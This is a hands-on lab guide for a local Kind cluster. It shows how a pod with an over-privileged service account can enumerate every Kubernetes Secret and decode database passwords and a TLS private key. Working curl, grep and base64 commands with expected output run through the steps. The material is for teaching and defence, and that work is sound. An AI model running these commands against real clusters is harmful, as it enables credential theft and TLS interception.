# List Kubernetes Secrets

An attacker with access to a pod or with stolen credentials can enumerate and read Kubernetes Secrets across namespaces, harvesting TLS certificates, API tokens, database passwords, and other sensitive data stored in the cluster.

## Description

Kubernetes Secrets are objects designed for storing sensitive data such as passwords, tokens, and certificates. They are base64-encoded (not encrypted by default) and accessible to any principal with `get`, `list`, or `watch` permissions on the `secrets` resource.

Attackers who obtain a service account token with sufficient RBAC permissions — or who land on a node and read the API server directly — can enumerate every Secret in the cluster. Because secrets are only base64-encoded, decoding them is trivial and requires no additional tooling beyond `base64`.

Common targets include:

- TLS private keys mounted into ingress controllers or web servers
- Database connection strings and passwords
- Cloud provider API keys
- Image pull secrets containing registry credentials
- Service account tokens with elevated permissions

## Prerequisites

- A running Kind cluster named `workshop-cluster`.
- `kubectl` installed and configured to connect to your cluster.
- `base64` and `jq` available on your workstation.

## Scenario Overview

This scenario deploys two nginx variants into the `secrets-demo` namespace:

- **nginx** (plain HTTP on port 8080) backed by a ConfigMap with the nginx configuration and a Secret containing a fake database password.
- **nginx-tls** (HTTPS on port 8443) backed by a Secret containing a self-signed TLS certificate and private key.

A dedicated `secret-reader` ServiceAccount with `ClusterRole` permissions to list and get Secrets cluster-wide is used to simulate an over-privileged workload.

## Quick Start

### Step 1 - Create the namespace and secrets

Create the target namespace:

```bash
kubectl create namespace secrets-demo
```

Create a generic Secret simulating a database password:

```bash
kubectl create secret generic db-credentials \
  --namespace secrets-demo \
  --from-literal=DB_HOST=postgres.internal \
  --from-literal=DB_USER=admin \
  --from-literal=DB_PASSWORD='S3cur3P@ssw0rd!'
```

Create a TLS Secret from the pre-generated self-signed certificates included in this directory:

```bash
kubectl create secret tls nginx-tls-certificates \
  --namespace secrets-demo \
  --cert=localhost.pem \
  --key=localhost-key.pem
```

Create the nginx ConfigMaps from the configuration files:

```bash
kubectl create configmap nginx-configuration \
  --namespace secrets-demo \
  --from-file=default.conf=default.conf

kubectl create configmap nginx-configuration-tls \
  --namespace secrets-demo \
  --from-file=default.conf=default-tls.conf

kubectl create configmap nginx-index \
  --namespace secrets-demo \
  --from-file=index.html=index.html
```

### Step 2 - Deploy the workloads

Deploy the plain HTTP nginx and the TLS nginx:

```bash
kubectl apply -f nginx.yaml --namespace secrets-demo
kubectl apply -f nginx-tls.yaml --namespace secrets-demo
```

Deploy the over-privileged attacker pod that has a service account allowed to list secrets cluster-wide:

```bash
kubectl apply -f secret-reader.yaml
```

Wait for all pods to be ready:

```bash
kubectl get pods --namespace secrets-demo
kubectl get pods --namespace default -l app=secret-reader
```

Expected output:

```
# secrets-demo namespace
NAME                        READY   STATUS    RESTARTS   AGE
nginx-7d6b9b6d7b-x4p2q     1/1     Running   0          30s
nginx-tls-8c5f7b4d9-k8w2r  1/1     Running   0          30s

# default namespace
NAME            READY   STATUS    RESTARTS   AGE
secret-reader   1/1     Running   0          20s
```

### Step 3 - Enumerate secrets from inside the pod

Exec into the attacker pod:

```bash
kubectl exec -it pod/secret-reader -- /bin/sh
```

Inside the pod, the service account token is automatically mounted. Use it to authenticate to the Kubernetes API and list all secrets across every namespace:

```bash
# Set up variables from the mounted service account
APISERVER=https://kubernetes.default.svc.cluster.local
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# List all secrets in all namespaces
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets" | grep '"name"'
```

Expected output (abbreviated):

```
"name": "db-credentials",
"name": "nginx-tls-certificates",
"name": "secret-reader-token-xxxxx",
```

### Step 4 - Read and decode a specific secret

Read the database credentials secret and decode each value:

```bash
# Fetch the secret object
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/secrets-demo/secrets/db-credentials"
```

Expected output (abbreviated):

```json
{
  "data": {
    "DB_HOST": "cG9zdGdyZXMuaW50ZXJuYWw=",
    "DB_PASSWORD": "UzNjdXIzUEBzc3cwcmQh",
    "DB_USER": "YWRtaW4="
  }
}
```

Decode the values:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/secrets-demo/secrets/db-credentials" \
  | grep -E '"DB_' \
  | awk -F'"' '{print $2": "$4}' \
  | while IFS=': ' read key val; do
      echo "$key: $(echo $val | base64 -d)"
    done
```

Expected output:

```
DB_HOST: postgres.internal
DB_PASSWORD: S3cur3P@ssw0rd!
DB_USER: admin
```

### Step 5 - Extract the TLS private key

Fetch the TLS secret and decode the private key:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/secrets-demo/secrets/nginx-tls-certificates" \
  | grep '"tls.key"' \
  | awk -F'"' '{print $4}' \
  | base64 -d
```

The output is the raw PEM-encoded RSA private key — the same key currently serving HTTPS traffic for the nginx-tls deployment. An attacker who obtains this can perform TLS interception on any traffic encrypted with the corresponding certificate.

### Step 6 - List secrets across all namespaces

Enumerate every namespace and secret name in one command:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets" \
  | grep -E '"namespace"|"name".*:' \
  | paste - -
```

This gives a quick inventory of every secret the service account can read across the entire cluster.

## Cleanup

```bash
kubectl delete -f secret-reader.yaml
kubectl delete -f nginx.yaml --namespace secrets-demo
kubectl delete -f nginx-tls.yaml --namespace secrets-demo
kubectl delete namespace secrets-demo
```

## Resources

- [Kubernetes Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [Kubernetes RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Encrypting Secret Data at Rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)
- [MITRE ATT&CK - Credential Access: Kubernetes Secrets](https://attack.mitre.org/techniques/T1552/007/)
